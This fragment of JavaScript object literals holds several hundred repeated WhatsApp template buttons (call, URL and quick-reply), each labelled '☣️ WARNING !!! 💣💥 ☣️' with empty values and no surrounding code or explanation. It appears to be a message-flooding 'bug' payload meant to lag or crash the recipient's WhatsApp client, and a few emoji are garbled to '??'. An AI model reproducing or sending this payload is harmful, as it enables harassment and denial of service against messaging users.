{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣?? ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
